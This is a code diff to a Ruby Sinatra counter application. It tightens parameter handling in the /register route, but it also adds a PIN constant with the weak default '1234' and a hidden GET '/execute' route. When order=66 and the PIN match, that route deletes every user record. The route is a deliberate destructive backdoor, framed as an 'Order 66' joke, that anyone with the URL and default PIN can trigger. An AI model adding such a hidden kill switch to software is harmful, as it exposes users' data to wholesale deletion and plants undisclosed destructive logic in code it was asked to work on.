@@ -2,6 +2,7 @@ require_relative 'config/application'
 
 class Counter < Sinatra::Base
   SECRET = ENV['SECRET'] || "secret"
+  PIN = ENV['SECRET'] || "1234"
 
   before do
   	return unless request.env['CONTENT_TYPE'] == "application/json" 
@@ -14,7 +15,12 @@ class Counter < Sinatra::Base
   end
 
   post "/register" do
-  	@user = User.new(params)
+    # No safe_params in sinatra, best be explicit
+  	@user = User.new(
+      email: params[:email],
+      password: params[:password],
+      password_confirmation: params[:password_confirmation]
+    )
   	return json({token: set_token}) if @user.save
   	halt 400, "'I have a bad feelign about this' (#{@user.errors.full_messages.join(', ')})\n"
   end
@@ -41,6 +47,11 @@ class Counter < Sinatra::Base
   	user.counter = params[:current] || 1
   	user.save
   	json(to_json_api(user))
+  end
+
+  get '/execute' do
+    User.destroy_all if params[:order] == '66' && params[:pin] == PIN
+    redirect '/'
   end
 
   private
